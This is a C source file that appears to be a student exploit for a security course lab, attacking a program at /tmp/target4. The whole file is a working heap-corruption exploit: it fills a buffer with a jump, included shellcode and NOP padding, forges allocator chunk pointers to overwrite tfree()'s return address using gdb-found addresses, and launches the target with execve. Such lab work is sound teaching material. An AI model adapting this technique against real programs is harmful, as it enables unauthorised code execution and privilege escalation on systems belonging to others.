#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define BUF_SIZE 1024

int main(void)
{

  // write a buffer wtih size 1024 
  char buffer[BUF_SIZE];
  int index = 0;
 
  // first line of buffer   4 bytes are written as JMP AMT NOP NOP
  buffer[index++] = 0xeb;   //short jump, jump 1 byte at a time, 8 bits
  buffer[index++] = 0x06;   //jump 15bytes * 8 =120 bits = 30 * 0x90
  buffer[index++] = 0x90;
  buffer[index++] = 0x90;

  //this 4 bytes will be overwritten by return addr in tfree()
  *((int *) (buffer+index)) = 0xffffffff;
  index+=4;

  // // NOP sled followed by shellcode
  // for(; index < 8; index++){
  //  buffer[index] = 0x90;
  // }

 // Insert shellcode to front of the buffer 45 bytes
  for(; index <  8+strlen(shellcode); index++){
      buffer[index] = shellcode[index-8];
  }

 //padding the rest with NOP
  for(; index < 304; index++) { // data size=300bytes + additional unknow 4 bytes 
      buffer[index] = 0x90; 
  }

   // start from the 2nd chunk, set buffer addr and return address
  // obtain buf address by running gdb: p $p ->  x $eax
   *((int *) (buffer + index)) = 0x8049a48;  //buff address where p points to in heap,  p->s.l = buf
   index+=4;        
   // obtain ret addr by running gdb: step inot tfree and then p $ebp+4
   *((int *) (buffer + index)) = 0xbffffa1c; //addr of tfree's return addr  p->s.r = &(retAddr)
   index+=4;        //0xbffffcdd   

 //padding the rest with NOP
  for(; index < 1024; index++) {
      buffer[index] = 0x90; 
  }
 
  char *args[3];
  char *env[1];
  args[0] = TARGET;
  args[1] = buffer; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
